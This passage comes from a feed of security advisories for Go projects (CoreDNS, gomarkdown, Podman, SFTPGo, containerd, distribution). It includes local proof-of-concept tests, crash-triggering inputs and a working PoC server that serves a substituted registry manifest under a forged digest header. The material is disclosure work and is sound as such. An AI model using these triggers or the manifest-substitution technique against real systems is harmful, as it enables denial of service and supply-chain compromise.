  3. Add regression tests covering Port: -1 headless services and empty transfer batches.

Example consumer-side guard:

for records := range pchan {
    if len(records) == 0 {
        continue
    }
    if x, ok := records[0].(*dns.SOA); ok && soa == nil {
        soa = x
    }
    ...
}

PoC

Safe local unit-level reproduction was performed. It does not contact external infrastructure and does not require a live Kubernetes cluster.

Reproducer A: the transfer sink panics on an empty batch

A temporary package test was added under plugin/transfer:

package transfer

import (
    "context"
    "fmt"
    "testing"

    "github.com/coredns/coredns/plugin/pkg/dnstest"
    "github.com/coredns/coredns/plugin/test"

    "github.com/miekg/dns"
)

type auditEmptyBatchTransferer struct{}

func (auditEmptyBatchTransferer) Transfer(zone string, serial uint32) (<-chan []dns.RR, error) {
    if zone != "example.org." {
        return nil, ErrNotAuthoritative
    }
    ch := make(chan []dns.RR, 3)
    ch <- []dns.RR{test.SOA(fmt.Sprintf("%s 100 IN SOA ns.dns.%s hostmaster.%s %d 7200 1800 86400 100", zone, zone, zone, 1))}
    ch <- []dns.RR{}
    close(ch)
    return ch, nil
}

func TestAuditEmptyTransferBatchPanics(t *testing.T) {
    tr := &Transfer{
        Transferers: []Transferer{auditEmptyBatchTransferer{}},
        xfrs:        []*xfr{{Zones: []string{"example.org."}, to: []string{"*"}}},
    }

    req := new(dns.Msg)
    req.SetQuestion("example.org.", dns.TypeAXFR)
    rec := dnstest.NewRecorder(&test.ResponseWriter{TCP: true})

    defer func() {
        if rec := recover(); rec == nil {
            t.Fatal("expected empty transfer batch to panic")
        }
    }()

    _, _ = tr.ServeDNS(context.Background(), rec, req)
}

Verification command and result:

$ go test ./plugin/transfer -run TestAuditEmptyTransferBatchPanics -count=1 -v
=== RUN   TestAuditEmptyTransferBatchPanics
--- PASS: TestAuditEmptyTransferBatchPanics (0.00s)
PASS
ok  	github.com/coredns/coredns/plugin/transfer	0.005s

Reproducer B: the built-in k8s_external transferer emits the empty batch

A temporary package test was added under plugin/k8s_external:

package external

import (
    "testing"
    "time"

    "github.com/coredns/coredns/plugin/etcd/msg"
    "github.com/coredns/coredns/plugin/kubernetes"
    "github.com/coredns/coredns/request"

    "github.com/miekg/dns"
)

func TestAuditHeadlessNoPortTransferEmitsEmptyBatch(t *testing.T) {
    e := New()
    e.Zones = []string{"example.com."}
    e.headless = true
    e.externalAddrFunc = func(request.Request, bool) []dns.RR { return nil }
    e.externalSerialFunc = func(string) uint32 { return 1 }
    e.externalServicesFunc = func(string, bool) ([]msg.Service, map[string][]msg.Service) {
        return nil, map[string][]msg.Service{
            "/coredns/com/example/testns/headless/" + kubernetes.Endpoint: {{Host: "192.0.2.10", Port: -1, TTL: 5, Key: "/coredns/com/example/testns/headless/endpoint-a"}},
        }
    }

    ch, err := e.Transfer("example.com.", 0)
    if err != nil {
        t.Fatalf("Transfer returned error: %v", err)
    }

    deadline := time.After(time.Second)
    for {
        select {
        case batch, ok := <-ch:
            if !ok {
                t.Fatal("transfer closed before emitting an empty batch")
            }
            if len(batch) == 0 {
                return
            }
        case <-deadline:
            t.Fatal("timed out waiting for an empty batch")
        }
    }
}

Verification command and result:

$ go test ./plugin/k8s_external -run TestAuditHeadlessNoPortTransferEmitsEmptyBatch -count=1 -v
=== RUN   TestAuditHeadlessNoPortTransferEmitsEmptyBatch
--- PASS: TestAuditHeadlessNoPortTransferEmitsEmptyBatch (0.00s)
PASS
ok  	github.com/coredns/coredns/plugin/k8s_external	0.012s

Additional focused verification:

$ go test ./plugin/transfer ./plugin/k8s_external ./plugin/kubernetes -run 'TestAudit|^$' -count=1 -v
ok  	github.com/coredns/coredns/plugin/transfer	0.006s
ok  	github.com/coredns/coredns/plugin/k8s_external	0.013s

Affected package suites:

entry.title: [github.com/gomarkdown/markdown] gomarkdown/markdown IsSafeURL panics on short URLs
entry.content:
Summary

IsSafeURL slices url[:nPath] before checking that len(url) >= nPath, so a URL shorter than a path prefix (0, 1 or 2 bytes) triggers a slice-bounds panic, and this is reached end to end when the html.Safelink hardening flag is enabled and the input contains an empty or very short link destination, giving an unrecoverable crash DoS. Confirmed at HEAD (e08cff8; present since 2022).

The defect

parser/parser.go, IsSafeURL:

func IsSafeURL(url []byte) bool {
    nLink := len(url)
    for _, path := range validPaths {          // "/", "./", "../"
        nPath := len(path)
        linkPrefix := url[:nPath]               // line 789: sliced BEFORE the length guard
        if nLink >= nPath && bytes.Equal(linkPrefix, path) {   // line 790: guard is too late
            ...

url[:nPath] is evaluated before the nLink >= nPath check. When len(url) < nPath and cap(url) < nPath, the slice expression panics. Only the relative-path loop is affected; the adjacent URIs loop is already correctly guarded (the signal that this one deviates, the same signal as the anchor). Input: IsSafeURL("") panics ([:1] cap 0), IsSafeURL(".") panics ([:2] cap 1), IsSafeURL("..") panics ([:3] cap 2), while IsSafeURL("/") returns true. End to end: markdown.ToHTML(input, html.CommonFlags|html.Safelink) with input [x]() panics. Attacker model: (1) any service rendering untrusted Markdown with the html.Safelink flag (the URL-sanitizing hardening flag itself introduces the crash); or (2) any downstream that calls the exported parser.IsSafeURL on a 0/1/2-byte attacker URL, no flag required. No recover() anywhere, so an uncaught crash of the calling goroutine.

Verification

EXECUTED with negative controls. Direct: the empty/1/2-char cases panic with the exact slice-bounds message while "/" returns true. End to end via ToHTML with html.CommonFlags|html.Safelink: [x]() panics, while [x](/), [x](http://example.com), plain text, and [x](javascript:alert(1)) (safely dropped) do not. NOT verified: how many downstream apps enable Safelink or call IsSafeURL directly (the default no-Safelink render path does not reach it).

Suggested fix

Move the slice inside the guard: check nLink >= nPath first, then compute url[:nPath] (or use bytes.HasPrefix(url, path), which is length-safe). One-line change, mirroring the already-correct URIs loop.

Also checked and sound: CVE-2026-40890 (smartypants smartLeftAngle OOB) is fixed; CVE-2024-44337 (list/paragraph infinite loop) is fixed (deep nesting capped at maxNesting=64); default XSS is by design (Safelink/SkipHTML not in CommonFlags).

Tooling

AI assistance was used while investigating. The panic is executed-verified with negative controls (IsSafeURL on empty/./.. panics with a slice-bounds error while "/" returns true; ToHTML with html.Safelink on [x]() panics while valid and javascript: links do not), and I confirmed at HEAD that IsSafeURL computes url[:nPath] before the nLink >= nPath guard.

entry.title: [go.podman.io/podman/v6] Podman: The `podman run` command can be instructed to disable almost all sandboxing by image annotation
entry.content:
Impact

Podman v4.4.0 added a feature where container checkpoints (from the podman container checkpoint command) could be distributed via OCI registry, and pulled from that registry and run via the podman run command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When podman run detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, podman run --cap-drop=ALL on an image that is determined to be a checkpoint will ignore --cap-drop=all and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, io.podman.annotations.checkpoint.runtime.name. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in podman run allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality.

Patch

The commit introducing this functionality was reverted.

3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main) ea9243e04d1db3886dc3a51ee3300ffb547cfc02 450c64426dbcff1097d3c7911d791101e3d16f4c 2d05a7c61f022d4f24980ea6d307fa53da2b8692 (v6.1) 7728ba0a90094408ad9078e36c3622a651d49616 24706290d5c974f078d8ca284026802515f28e92 29c8c6e50607df7a7d735ace09ff0ea099c0b3e0 (v5.8)

Workarounds

Images being pulled should be scanned for the io.podman.annotations.checkpoint.runtime.name annotation, and rejected if it is present. Podman does not presently have the ability to perform this scanning and rejection automatically.

Also not that rootless containers are not affected as they do not support checkpoint/restore at all currently.

Credits

entry.title: [github.com/drakkan/sftpgo/v2] SFTPGo source-side file-pattern filter bypass during copy operations
entry.content:
Summary

File pattern filters (denied_patterns / allowed_patterns) were evaluated on the destination of a copy only. A user holding the copy permission could copy a file denied by the filters to a permitted name and then read it. A recursive directory copy reproduced the contents of a restricted directory under a path where the filters do not deny them, and the hide policy was affected in the same way: a file reported as missing by stat and by directory listings could still be copied.

Details

An authenticated user can read the contents of files that the file pattern filters are configured to deny them. Nothing else is bypassed: the home directory, the virtual folder layout and the per-directory permissions are all still enforced, and both ends of the copy are paths the account can already reach. No access to other accounts and no administrative capability.

entry.title: [github.com/containerd/containerd/v2] containerd: Unpack DoS via repeated opaque whiteouts
entry.content:
Impact

A vulnerability exists in containerd's layer unpack handler where the processing of certain image layers causes superlinear time complexity. During the unpack operation, specific file configurations within the layer can trigger repeated directory traversals.

Consequently, pulling or importing a maliciously crafted image can result in increased unpack times and a moderate increase in CPU usage. This delays container startup, even if the compressed image layers are small. Additionally, in orchestrators like Kubernetes that apply concurrency limits to image pulls, these excessively long operations can reduce the available concurrency for other pulls, potentially delaying unrelated container deployments.

Patches

This bug has been fixed in containerd 2.3.5, 2.2.8, 2.0.12, and 1.7.35. Users should update to these versions to resolve the issue.

Workarounds

There are no known workarounds for this issue. Users are advised to only pull and import trusted images from known registries until the patch can be applied.

entry.title: [github.com/distribution/distribution/v3] Distribution: Client `manifests.Get()` does not verify returned content against requested digest
entry.content:
Summary

registry/client.(*manifests).Get(ctx, dgst, …) fetches a manifest by digest but never hashes the returned body and compares it against the requested digest. A malicious or compromised registry, or any MITM on the registry connection, can serve arbitrary manifest bytes in response to a digest-pinned request and the client returns the substituted content transparently to the caller. Any application relying on digest pinning for supply-chain integrity — image policy controllers, mirrors, pull-through caches — is silently undermined. The bundled pull-through proxy (registry/proxy/proxymanifeststore.go) is itself an unguarded consumer and is directly exploitable.

Details

Root cause: registry/client/repository.go:488-505 reads the response body and passes it directly to distribution.UnmarshalManifest without ever computing digest.FromBytes(body) and comparing against the caller-supplied dgst. The Docker-Content-Digest response header is parsed (lines 251-292 in descriptorFromResponse) only to populate an out-parameter (ReturnContentDigest) and is itself server-supplied — it is never recomputed from the body, so a lying server can set it to whatever value the caller requested while delivering different bytes.

Attack path: An attacker who controls the registry endpoint (malicious registry, compromised upstream, DNS hijack, or TLS MITM) responds to GET /v2/{name}/manifests/{digest} with:

  1. Docker-Content-Digest: <requested-digest> (forged header)
  2. A body containing a different, attacker-chosen manifest

The client calls distribution.UnmarshalManifest on the substituted body, returns the attacker's manifest as if it were the pinned content, and the caller has no way to detect the substitution.

Why it matters: The entire value of digest pinning is to guarantee content-addressable integrity against exactly this threat model (hostile or MITM server). The registry/proxy/proxymanifeststore.go:42-87 pull-through cache calls remoteManifests.Get(ctx, dgst) and immediately writes the result to local storage with no re-verification — so a poisoned remote can permanently inject a bad manifest into the mirror cache, affecting all subsequent consumers.

Relevant code path (repository.go, simplified):

// line ~496
func (ms *manifests) Get(ctx context.Context, dgst digest.Digest, options ...distribution.ManifestServiceOption) (distribution.Manifest, error) {
    ...
    resp, err := ms.client.Get(u)
    ...
    body, err := ioutil.ReadAll(resp.Body)  // no size limit, no digest check
    ...
    m, _, err := distribution.UnmarshalManifest(ct, body)  // returns attacker bytes
    return m, err
}

PoC

module poc

go 1.24.10

require (
        github.com/distribution/reference v0.6.0
        github.com/docker/distribution v2.8.3+incompatible
        github.com/opencontainers/go-digest v1.0.0
)

require (
        github.com/beorn7/perks v1.0.1 // indirect
        github.com/docker/go-metrics v0.0.1 // indirect
        github.com/docker/libtrust v0.0.0-20160708172513-aabc10ec26b7 // indirect
        github.com/golang/protobuf v1.3.2 // indirect
        github.com/gorilla/mux v1.8.1 // indirect
        github.com/matttproud/golang_protobuf_extensions v1.0.1 // indirect
        github.com/opencontainers/image-spec v1.1.1 // indirect
        github.com/prometheus/client_golang v1.1.0 // indirect
        github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90 // indirect
        github.com/prometheus/common v0.6.0 // indirect
        github.com/prometheus/procfs v0.0.3 // indirect
        github.com/sirupsen/logrus v1.9.4 // indirect
        golang.org/x/sys v0.13.0 // indirect
)

main.go:

// PoC: registry/client manifests.Get() does not verify the requested digest
// against the returned body. A malicious registry (or MITM) can serve
// arbitrary content for a digest-pinned manifest reference and the client
// will accept it.
package main

import (
        "context"
        "fmt"
        "net/http"
        "net/http/httptest"

        "github.com/distribution/reference"
        "github.com/docker/distribution/manifest/schema2"
        "github.com/docker/distribution/registry/client"
        "github.com/opencontainers/go-digest"
)

// A real, "trusted" manifest the user pinned by digest.
var trustedManifest = []byte(`{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {"mediaType": "application/vnd.docker.container.image.v1+json","size": 1,"digest": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
   "layers": []
}`)

// A different, attacker-controlled manifest the malicious server returns instead.
var evilManifest = []byte(`{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {"mediaType": "application/vnd.docker.container.image.v1+json","size": 1,"digest": "sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"},
   "layers": []
}`)

func main() {
        pinnedDigest := digest.FromBytes(trustedManifest)
        evilDigest := digest.FromBytes(evilManifest)
        fmt.Println("client requests manifest pinned at:", pinnedDigest)
        fmt.Println("server will instead return content :", evilDigest)

        srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                // Lie: claim the digest matches what was asked, but serve evil bytes.
                w.Header().Set("Content-Type", schema2.MediaTypeManifest)
                w.Header().Set("Docker-Content-Digest", pinnedDigest.String())
                w.WriteHeader(200)
                w.Write(evilManifest)
        }))
        defer srv.Close()

        name, _ := reference.WithName("library/alpine")
        repo, err := client.NewRepository(name, srv.URL, http.DefaultTransport)
        if err != nil {
                panic(err)
        }
        ms, _ := repo.Manifests(context.Background())

        // Fetch by *digest* — caller expects content-addressed integrity.
        m, err := ms.Get(context.Background(), pinnedDigest)
        if err != nil {
                fmt.Println("Get error:", err)
                return
        }
        _, payload, _ := m.Payload()
        got := digest.FromBytes(payload)

        if got != pinnedDigest {
                fmt.Println()
                fmt.Println(">>> BYPASS: client accepted manifest that does NOT match requested digest")
                fmt.Println("    requested:", pinnedDigest)
                fmt.Println("    received :", got)
        } else {
                fmt.Println("OK: digest verified")
        }
}

entry.title: [github.com/docker/distribution] Distribution: Client `manifests.Get()` does not verify returned content against requested digest
entry.content:
Summary

registry/client.(*manifests).Get(ctx, dgst, …) fetches a manifest by digest but never hashes the returned body and compares it against the requested digest. A malicious or compromised registry, or any MITM on the registry connection, can serve arbitrary manifest bytes in response to a digest-pinned request and the client returns the substituted content transparently to the caller. Any application relying on digest pinning for supply-chain integrity — image policy controllers, mirrors, pull-through caches — is silently undermined. The bundled pull-through proxy (registry/proxy/proxymanifeststore.go) is itself an unguarded consumer and is directly exploitable.

Details

Root cause: registry/client/repository.go:488-505 reads the response body and passes it directly to distribution.UnmarshalManifest without ever computing digest.FromBytes(body) and comparing against the caller-supplied dgst. The Docker-Content-Digest response header is parsed (lines 251-292 in descriptorFromResponse) only to populate an out-parameter (ReturnContentDigest) and is itself server-supplied — it is never recomputed from the body, so a lying server can set it to whatever value the caller requested while delivering different bytes.

Attack path: An attacker who controls the registry endpoint (malicious registry, compromised upstream, DNS hijack, or TLS MITM) responds to GET /v2/{name}/manifests/{digest} with:

  1. Docker-Content-Digest: <requested-digest> (forged header)
  2. A body containing a different, attacker-chosen manifest

The client calls distribution.UnmarshalManifest on the substituted body, returns the attacker's manifest as if it were the pinned content, and the caller has no way to detect the substitution.

Why it matters: The entire value of digest pinning is to guarantee content-addressable integrity against exactly this threat model (hostile or MITM server). The registry/proxy/proxymanifeststore.go:42-87 pull-through cache calls remoteManifests.Get(ctx, dgst) and immediately writes the result to local storage with no re-verification — so a poisoned remote can permanently inject a bad manifest into the mirror cache, affecting all subsequent consumers.

Relevant code path (repository.go, simplified):

    ...
    body, err := ioutil.ReadAll(resp.Body)  // no size limit, no digest check
    ...
    m, _, err := distribution.UnmarshalManifest(ct, body)  // returns attacker bytes
    return m, err
}
